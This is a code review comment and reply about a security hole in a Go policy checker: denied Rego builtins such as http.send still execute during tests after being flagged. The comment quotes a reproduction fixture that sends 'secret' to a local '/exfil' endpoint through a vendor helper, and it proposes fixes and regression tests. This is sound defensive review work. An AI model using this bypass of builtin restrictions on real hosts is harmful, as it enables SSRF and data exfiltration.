Comment (internal/inlinepolicy/check.go:90):
Blocking: a denied builtin that `deniedReachable` has just flagged is still executed on the agent host. `runTests` runs even when step 2 found hits.

I reproduced this against b9c1cad with the fixture from `TestCheck_CompileAndBuiltins`. The vendor tree has `lib/net.rego: fetch(u) := http.send({"method":"GET","url":u})`. The authored `x_test.rego` is `test_x if { net.fetch("http://127.0.0.1:<port>/exfil?d=secret") }`. `Check` returns the expected `forbidden builtin http.send is reachable from authored rule ...` error, but a local `httptest` server records `GET /exfil?d=secret` during the same `Check` call. `regocheck` doesn't catch this at parse level, because the authored module never names `http.send` directly. So under `apply_safe` (inline bundles are safe), a `configure-policy` author or a compromised API can make the agent issue arbitrary HTTP requests from the host (SSRF, cloud metadata, exfil) through any vendor helper that wraps `http.send`. The revision is rejected afterwards, but the request has already gone out. This is the D17/§8 boundary ("the agent enforces forbidden builtins **before running any inline module**").

Suggested fix, pick either or both:
- Return before `runTests` when `deniedReachable` finds any hit, since the revision is rejected anyway.
- Belt and braces: run the tester with a compiler restricted to `policyeval.SandboxCapabilities()`, or at least make `http.send` and `net.lookup_ip_addr` unavailable at eval time.

Please add a regression test: an httptest server that must see zero requests.
Replies:
**lisa implementation guidance:** Fix (inlinepolicy.Check): return BEFORE runTests when deniedReachable reports any hit. Defence in depth: runTests compiles copies of the modules with policyeval.SandboxCapabilities() after rewriting every DeniedBuiltins ref to an agent-owned stub builtin that always errors, so a denied builtin can never execute during tests (vendor modules that only reference it off the authored path still compile; their tests just fail as warnings). Regression tests: httptest probe must see zero requests for (a) the reviewer's authored _test.rego via vendor net.fetch and (b) a vendor test calling http.send.

